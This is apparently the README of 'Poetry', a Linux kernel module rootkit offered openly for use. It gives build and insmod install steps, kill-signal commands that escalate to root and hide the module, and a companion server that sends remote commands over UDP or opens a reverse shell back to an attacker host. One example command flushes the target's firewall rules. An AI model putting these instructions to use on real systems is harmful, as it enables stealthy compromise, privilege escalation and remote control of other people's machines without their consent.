![nil is goated](https://img.shields.io/badge/nil-goated-green)
# Poetry
This is a Linux kernel module rootkit made for >=5.X. It features privilege escalation, module hiding, and RCE/reverse shell capabilities. 

## Kernel Module
### Tested On:
- 5.4.0
- 5.13.0
### Building
```sh
# install needed packages
apt update
apt install build-essential \
            checkinstall \
            linux-headers-$(uname -r) \
            -y 

cd lkm/

# comment out the printk debug statements
sed -i 's/debug=1/debug=0/g' poet.c 

# compile the kernel module with the corresponding headers
make 
```
The compiled LKM will be: `poet.ko`
### Installing
```sh
# install the kernel module on the system
sudo insmod poet.ko 
```

#### Privilege Escalation + Module Hiding
```sh
kill -35 0 # escalate to root
kill -36 0 # hide poet module
kill -37 0 # unhide poet module
```

## Server Setup + Usage
To use the RCE section of the rootkit:
```
Usage of ./poetry:
  -c string
        Choice: Single command to run through UDP. No output.
  -r string
        Optional: Where to send the shell. Defaults to interface IP if not specified. 
  -s    Choice: Spawn and connect to reverse shell
  -t string
        Required: IP address to target
```

### Docker
The server can be compiled and run through Docker. 

```sh
cd srv/
docker build -t poetry .
docker run poetry # run without args to see usage

# you must specify the -r option here when using the reverse shell capability. This will be the IP of the machine running the docker container. 

# EXAMPLE 
docker run -itp 7337:7337 poetry -t 192.168.10.10 -r 192.168.10.9 -s

# EXAMPLE
docker run poetry -t 192.168.10.10 -c "iptables -F"
```
### Building Binaries
Secondary option.
#### If not on Linux:
Docker must be installed in order to statically compile the server binary. 
```sh
cd srv/
make # compile the go binary
ls out/ # compiled binary will be in the out/ directory
```
#### If on Linux:
```sh
cd srv/

# compile the server binary
go build
```

The compiled binary will be called: `poetry`

#### Binary Usage
Copy the compiled binary to the host system. Run the following commands to interact with the target:
```sh
export IFACE=<ethernet_interface> # set interface env var
sudo -E ./poetry -t <target_ip> -s # -s attempts to spawn a reverse tcp shell
sudo -E ./poetry -t <target_ip> -c "<command>" # -c sends a single command through udp. no output
```

